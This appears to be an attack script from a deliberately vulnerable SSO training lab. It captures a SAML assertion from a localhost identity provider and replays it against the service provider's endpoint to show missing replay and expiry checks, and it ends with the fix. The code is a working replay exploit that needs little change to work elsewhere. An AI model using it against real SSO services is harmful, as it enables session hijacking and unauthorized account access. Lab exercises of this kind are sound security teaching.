#!/usr/bin/env python3
"""
==============================================================
 SSO Vuln Lab — Attack: Lab 3 — SAML Assertion Replay
==============================================================
 Target:  http://localhost:3000/lab3/acs
 Goal:    Reuse a previously captured SAML assertion to gain
          authenticated access without valid credentials
 Impact:  Session hijack / persistent unauthorized access
 CVSSv3:  8.1 (High)

 Root cause:
   SP does not maintain a record of consumed assertion IDs,
   and does not enforce NotOnOrAfter expiry timestamps.
   A captured base64 SAMLResponse can be replayed forever.

 Real scenarios:
   - Attacker sniffs SAML POST over HTTP (no TLS)
   - Attacker steals SAML token from browser history/logs
   - Attacker MiTMs HTTP-POST binding (no binding signing)
   - Stolen from Referer header, XSS, or network capture

 HackerOne relevant reports:
   HackerOne #703583 — SAML replay via missing assertion tracking
==============================================================
"""

import sys, base64, time, requests

SP_URL  = "http://localhost:3000"
IDP_URL = "http://localhost:8080"

def capture_assertion(email, password, lab="lab3"):
    """
    Do a real login to capture a SAMLResponse.
    Returns the raw base64 SAMLResponse for replay.
    """
    session = requests.Session()
    print(f"[*] Performing initial login as {email} to capture assertion...")

    r = session.get(f"{SP_URL}/{lab}/login", allow_redirects=False)
    if r.status_code not in (301,302):
        print(f"[!] Unexpected response: {r.status_code}")
        return None

    idp_url = r.headers.get("Location","")

    r2 = session.get(idp_url)
    from lxml import etree
    tree = etree.fromstring(r2.content, parser=etree.HTMLParser())
    saml_req = relay = ""
    for inp in tree.findall(".//input"):
        if inp.get("name") == "SAMLRequest": saml_req = inp.get("value","")
        if inp.get("name") == "RelayState":  relay    = inp.get("value","")

    r3 = session.post(f"{IDP_URL}/saml/sso", data={
        "email":       email,
        "password":    password,
        "SAMLRequest": saml_req,
        "RelayState":  relay,
    })

    tree2 = etree.fromstring(r3.content, parser=etree.HTMLParser())
    saml_resp = ""
    for inp in tree2.findall(".//input"):
        if inp.get("name") == "SAMLResponse": saml_resp = inp.get("value","")

    if saml_resp:
        xml = base64.b64decode(saml_resp)
        root = etree.fromstring(xml)
        ns = {"saml":"urn:oasis:names:tc:SAML:2.0:assertion"}
        name_id = root.findtext(".//saml:NameID", namespaces=ns)
        not_after = ""
        scd = root.find(".//saml:SubjectConfirmationData", ns)
        if scd is not None:
            not_after = scd.get("NotOnOrAfter","")
        print(f"[✓] Captured assertion for: {name_id}")
        print(f"[✓] NotOnOrAfter: {not_after}")
        print(f"[✓] SAMLResponse length: {len(saml_resp)} chars")
        return saml_resp, not_after
    else:
        print("[!] Failed to capture SAMLResponse")
        return None, None

def replay_assertion(saml_b64, delay=0, replay_count=3):
    """
    Replay the captured assertion multiple times.
    Without replay protection, all replays succeed.
    """
    print(f"\n[*] Replaying assertion {replay_count} times (delay={delay}s)...")

    for i in range(replay_count):
        if delay > 0:
            print(f"[*] Waiting {delay}s before replay {i+1}...")
            time.sleep(delay)

        session = requests.Session()
        r = session.post(f"{SP_URL}/lab3/acs", data={
            "SAMLResponse": saml_b64,
            "RelayState":   "lab3-replay",
        }, allow_redirects=True)

        if "dashboard" in r.url:
            print(f"[✓] Replay #{i+1} SUCCEEDED → {r.url}")
        else:
            print(f"[✗] Replay #{i+1} failed: {r.status_code} {r.url}")

def main():
    print("""
╔══════════════════════════════════════════════════════╗
║  LAB 3 — SAML Assertion Replay Attack               ║
╚══════════════════════════════════════════════════════╝

SCENARIO: Attacker captures victim's SAMLResponse
(e.g., from network traffic, logs, or XSS).
The assertion has NotOnOrAfter expiry but SP never checks it.
""")
    email    = sys.argv[1] if len(sys.argv) > 1 else "bob@lab.local"
    password = sys.argv[2] if len(sys.argv) > 2 else "bob123"

    print(f"[1] Capturing assertion for {email}...")
    saml_b64, not_after = capture_assertion(email, password)

    if not saml_b64:
        # Use a hardcoded test payload for demonstration
        print("[*] Using demonstration mode (no live capture)")
        print("[*] In real attack: capture from Burp, tcpdump, XSS exfil, etc.")
        return

    print(f"\n[2] Assertion captured. NotOnOrAfter: {not_after}")
    print("[2] Simulating passage of time (in real attack this would be hours later)")

    print("\n[3] Starting replay attacks...")
    replay_assertion(saml_b64, delay=1, replay_count=3)

    print(f"""
╔══════════════════════════════════════════════════════╗
║  REPLAY ATTACK COMPLETE                              ║
║                                                      ║
║  Key finding: NotOnOrAfter was '{not_after}'       
║  but the SP accepted replays AFTER expiry.           ║
║                                                      ║
║  Fix: Track assertion IDs in a cache (Redis/DB)     ║
║       Enforce NotOnOrAfter strictly                 ║
╚══════════════════════════════════════════════════════╝
""")

if __name__ == "__main__":
    main()
